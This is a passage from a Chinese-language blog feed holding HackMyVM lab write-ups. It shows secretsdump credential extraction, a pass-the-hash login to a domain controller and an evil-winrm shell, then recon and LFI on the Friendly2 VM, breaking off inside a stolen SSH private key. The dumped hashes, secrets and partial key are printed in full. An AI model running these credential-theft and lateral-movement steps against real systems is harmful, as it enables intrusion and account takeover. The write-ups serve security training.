<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Saved HKLM<span class="token punctuation">\</span>SECURITY to <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.56.104<span class="token punctuation">\</span>share<span class="token punctuation">\</span>SECURITY.save</code></pre>
<p>用<code>secretsdump</code>提取一下哈希</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> secretsdump.py <span class="token parameter variable">-system</span> SYSTEM.save <span class="token parameter variable">-sam</span> SAM.save <span class="token parameter variable">-security</span> SECURITY.save <span class="token builtin class-name">local</span> 
Impacket v0.9.20 - Copyright <span class="token number">2019</span> SecureAuth Corporation

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Target system bootKey: 0x0c7ad5e1334e081c4dfecd5d77cc2fc6
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Dumping <span class="token builtin class-name">local</span> SAM hashes <span class="token punctuation">(</span>uid:rid:lmhash:nthash<span class="token punctuation">)</span>
Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> SAM hashes extraction failed: <span class="token punctuation">(</span><span class="token string">'unpack requires a string argument of length 2'</span>, <span class="token string">"When unpacking field 'PekID | &lt;H=0 | ''[:2]'"</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Dumping cached domain logon information <span class="token punctuation">(</span>domain/username:hash<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Dumping LSA Secrets
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token variable">$MACHINE</span>.ACC 
<span class="token variable">$MACHINE</span>.ACC:plain_password_hex:7ab9e5f668e4fbdb7661b11a476e69ce1c7a7c0adc4695844049b921cfbe33b5cdb144d2673b6301c78717a275d9002a1056c17be2dbe4f97cbf74ce12d80e3fb51a93305addb136ae910c8fc08d96856531b526db8c7d211d29c25e50ab2f39982e736bb0a8e4a1ca0c0d8ba29747129aabe86dfe17c765f2f867a2225a882f08bd38677e4bf6cbec816721658658f7071884875694d2fd553c1251054896c1eab827f0c5ca2dae2632c0070f442bff837736d1b69ee63c755a6b77944765159c8fcffa7f946c79e045b117f27a1cc669e19add9380e5b16e49215a04c445e1ab673cefa21a17948ea8b3f918b1ea9f
<span class="token variable">$MACHINE</span>.ACC: aad3b435b51404eeaad3b435b51404ee:967fdb37b05f099f6659ab8196ec4db1
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> DPAPI_SYSTEM 
dpapi_machinekey:0x829d1c0e3b8fdffdc9c86535eac96158d8841cf4
dpapi_userkey:0x4813ee82e68a3bf9fec7813e867b42628ccd9503
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NL<span class="token variable">$KM</span> 
 0000   <span class="token number">44</span> C5 ED CE F5 0E BF 0C  <span class="token number">15</span> <span class="token number">63</span> 8B 8D 2F A3 06 8F   D<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>c<span class="token punctuation">..</span>/<span class="token punctuation">..</span>.
 0010   <span class="token number">62</span> 4D CA D9 <span class="token number">55</span> <span class="token number">20</span> <span class="token number">44</span> <span class="token number">41</span>  <span class="token number">75</span> <span class="token number">55</span> 3E <span class="token number">85</span> <span class="token number">82</span> 06 <span class="token number">21</span> <span class="token number">14</span>   bM<span class="token punctuation">..</span>U DAuU<span class="token operator">></span><span class="token punctuation">..</span>.<span class="token operator">!</span>.
 0020   8E FA A1 <span class="token number">77</span> 0A 9C 0D A4  9A <span class="token number">96</span> <span class="token number">44</span> 7C FC <span class="token number">89</span> <span class="token number">63</span> <span class="token number">91</span>   <span class="token punctuation">..</span>.w<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>D<span class="token operator">|</span><span class="token punctuation">..</span>c.
 0030   <span class="token number">69</span> 02 <span class="token number">53</span> <span class="token number">95</span> 1F ED 0E <span class="token number">77</span>  B5 <span class="token number">24</span> <span class="token number">17</span> BE 6E <span class="token number">80</span> A9 <span class="token number">91</span>   i.S<span class="token punctuation">..</span><span class="token punctuation">..</span>w.$<span class="token punctuation">..</span>n<span class="token punctuation">..</span>.
NL<span class="token variable">$KM</span>:44c5edcef50ebf0c15638b8d2fa3068f624dcad95520444175553e85820621148efaa1770a9c0da49a96447cfc896391690253951fed0e77b52417be6e80a991
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Cleaning up<span class="token punctuation">..</span></code></pre>
<h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><p>拿到一个$MACHINE.ACC 的哈希，尝试哈希传递攻击</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> crackmapexec smb <span class="token number">192.168</span>.56.126 <span class="token parameter variable">-u</span> username.txt <span class="token parameter variable">-H</span> 967fdb37b05f099f6659ab8196ec4db1 
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Windows Server <span class="token number">2022</span> Build <span class="token number">20348</span> x64 <span class="token punctuation">(</span>name:DC01<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:SOUPEDECODE.LOCAL<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing:True<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1:False<span class="token punctuation">)</span>
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>Enterprise:967fdb37b05f099f6659ab8196ec4db1 STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>Administrator:967fdb37b05f099f6659ab8196ec4db1 STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>Guest:967fdb37b05f099f6659ab8196ec4db1 STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>krbtgt:967fdb37b05f099f6659ab8196ec4db1 STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>Domain:967fdb37b05f099f6659ab8196ec4db1 STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>Domain:967fdb37b05f099f6659ab8196ec4db1 STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>Domain:967fdb37b05f099f6659ab8196ec4db1 STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>Domain:967fdb37b05f099f6659ab8196ec4db1 STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>Domain:967fdb37b05f099f6659ab8196ec4db1 STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>Cert:967fdb37b05f099f6659ab8196ec4db1 STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>Schema:967fdb37b05f099f6659ab8196ec4db1 STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>Enterprise:967fdb37b05f099f6659ab8196ec4db1 STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>Group:967fdb37b05f099f6659ab8196ec4db1 STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>Read-only:967fdb37b05f099f6659ab8196ec4db1 STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>Cloneable:967fdb37b05f099f6659ab8196ec4db1 STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>Protected:967fdb37b05f099f6659ab8196ec4db1 STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>Key:967fdb37b05f099f6659ab8196ec4db1 STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>Enterprise:967fdb37b05f099f6659ab8196ec4db1 STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>RAS:967fdb37b05f099f6659ab8196ec4db1 STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>Allowed:967fdb37b05f099f6659ab8196ec4db1 STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>Denied:967fdb37b05f099f6659ab8196ec4db1 STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.56.126  <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>+<span class="token punctuation">]</span> SOUPEDECODE.LOCAL<span class="token punctuation">\</span>DC01$:967fdb37b05f099f6659ab8196ec4db1 </code></pre>
<p><code>DC01$</code>验证成功，用<code>secretsdump</code>导出一下哈希</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> secretsdump.py soupedecode.local/<span class="token string">'DC01$'</span>@192.168.56.126 <span class="token parameter variable">-hashes</span> :967fdb37b05f099f6659ab8196ec4db1
```bash

<span class="token punctuation">[</span>-<span class="token punctuation">]</span> RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Dumping Domain Credentials <span class="token punctuation">(</span>domain<span class="token punctuation">\</span>uid:rid:lmhash:nthash<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8982babd4da89d33210779a6c5b078bd:::</code></pre>
<p>拿到Administrator的ntlm哈希,直接登录winrm</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">l-winrm <span class="token parameter variable">-i</span> <span class="token number">192.168</span>.56.128 <span class="token parameter variable">-u</span> Administrator <span class="token parameter variable">-H</span> 8982babd4da89d33210779a6c5b078bd                                
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machine
                                        
Data: For <span class="token function">more</span> information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of <span class="token builtin class-name">type</span> Errno::EHOSTUNREACH happened, message is No route to <span class="token function">host</span> - No route to <span class="token function">host</span> - connect<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">for</span> <span class="token string">"192.168.56.128"</span> port <span class="token number">5985</span> <span class="token punctuation">(</span><span class="token number">192.168</span>.56.128:5985<span class="token punctuation">)</span>
                                        
Error: Exiting with code <span class="token number">1</span>

 ~/Desktop                                                                                                                                                                                                                        30s  root@kali2  <span class="token number">16</span>:42:36 
<span class="token operator">></span> evil-winrm <span class="token parameter variable">-i</span> <span class="token number">192.168</span>.56.126 <span class="token parameter variable">-u</span> Administrator <span class="token parameter variable">-H</span> 8982babd4da89d33210779a6c5b078bd
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machine
                                        
Data: For <span class="token function">more</span> information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span>
soupedecode<span class="token punctuation">\</span>administrator</code></pre>










]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>Kerbrute</tag>
        <tag>lookupsid</tag>
        <tag>AS-REP</tag>
        <tag>PTH</tag>
        <tag>secretsdump</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-Friendly2</title>
    <url>/posts/ed97f61a/</url>
    <content><![CDATA[<p><strong>难度:easy</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.178</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># arp-scan -l</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.100  08:00:27:af:e6:ce       PCS Systemtechnik GmbH
<span class="token number">192.168</span>.56.178  08:00:27:0c:8f:a4       PCS Systemtechnik GmbH

<span class="token number">3</span> packets received by filter, <span class="token number">0</span> packets dropped by kernel
Ending arp-scan <span class="token number">1.10</span>.0: <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">1.919</span> seconds <span class="token punctuation">(</span><span class="token number">133.40</span> hosts/sec<span class="token punctuation">)</span>. <span class="token number">3</span> responded</code></pre>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nmap 192.168.56.178 -sV -A  -p-</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-05-27 <span class="token number">18</span>:14 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.178
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00056s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65533</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.4p1 Debian <span class="token number">5</span>+deb11u1 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">3072</span> <span class="token number">74</span>:fd:f1:a7:47:5b:ad:8e:8a:31:02:fe:44:28:9f:d2 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> <span class="token number">16</span>:f0:de:51:09:ff:fc:08:a2:9a:69:a0:ad:42:a0:48 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> <span class="token number">65</span>:0e:ed:44:e2:3e:f0:e7:60:0c:75:93:63:95:20:56 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.56 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span>
<span class="token operator">|</span>_http-title: Servicio de Mantenimiento de Ordenadores
<span class="token operator">|</span>_http-server-header: Apache/2.4.56 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>
MAC Address: 08:00:27:0C:8F:A4 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Device type: general purpose
Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
Network Distance: <span class="token number">1</span> hop
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.56</span> ms <span class="token number">192.168</span>.56.178

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">12.70</span> seconds</code></pre>
<p>开启了22 80两个端口，先去web看下<br><img src="https://img2.imgtp.com/2024/05/27/rGfCeV8f.png" alt="1716808904725.png" loading="lazy"><br>没什么功能点，直接扫目录</p>
<h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># gobuster dir -u http://192.168.56.178/ -x html,txt,php,bak,zip --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://192.168.56.178/
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              bak,zip,html,txt,php
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/index.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">2698</span><span class="token punctuation">]</span>
/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/tools                <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">316</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.178/tools/<span class="token punctuation">]</span>
/assets               <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">317</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.178/assets/<span class="token punctuation">]</span>
/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/server-status        <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
Progress: <span class="token number">1323360</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Finished
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span></code></pre>
<p>直接去看tools</p>
<h1 id="web信息探测-LFI"><a href="#web信息探测-LFI" class="headerlink" title="web信息探测+LFI"></a>web信息探测+LFI</h1><p><img src="https://img2.imgtp.com/2024/05/27/foi7f1zp.png" alt="1716808904725.png" loading="lazy"><br>源码发现了东西<br><img src="https://img2.imgtp.com/2024/05/27/JYyFTUkH.png" alt="1716808904725.png" loading="lazy"><br><img src="https://img2.imgtp.com/2024/05/27/SkYnR4N1.png" alt="1716808904726.png" loading="lazy"><br>盲猜文件包含，直接尝试一手<br><img src="https://img2.imgtp.com/2024/05/27/hAGTpo3B.png" alt="1716808904726.png" loading="lazy"><br><img src="https://img2.imgtp.com/2024/05/27/j3PBmcu9.png" alt="1716808904726.png" loading="lazy"><br><img src="https://img2.imgtp.com/2024/05/27/yHlzNIrz.png" alt="1716808904726.png" loading="lazy"><br><img src="https://img2.imgtp.com/2024/05/27/ow3Q355F.png" alt="1716808904727.png" loading="lazy"><br>好在功夫不负有心人，目录穿越成功LFI<br>尝试apache日志rce<br><img src="https://img2.imgtp.com/2024/05/27/bDBd9xiw.png" alt="1716808904727.png" loading="lazy"><br>未果<br>尝试读取用户ssh私钥<br><img src="https://img2.imgtp.com/2024/05/27/kx46R897.png" alt="1716808904727.png" loading="lazy"><br>nice,拿到私钥就可以拿到shell了，格式有点乱，让ai整理一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># cat aaa      </span>
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABC7peoQE4
zNYwvrv72HTs4TAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQC2i1yzi3G5
QPSlTgc/EdnvrisIm0Z0jq4HDQJDRMaXQ4i4UdIlbEgmO/FA17kHzY1Mzi5vJFcLUSVVcF
1IAny5Dh8VA4t/+LRH0EFx6ZFibYinUJacgteD0RxRAUqNOjiYayzG1hWdKsffGzKz8EjQ
9xcBXAR9PBs6Wkhur+UptHi08QmtCWLV8XAo0DW9ATlkhSj25KiicNm+nmbEbLaK1U7U/C
aXDHZCcdIdkZ1InLj246sovn5kFPaBBHbmez9ji11YNaHVHgEkb37bLJm95l3fkU6sRGnz
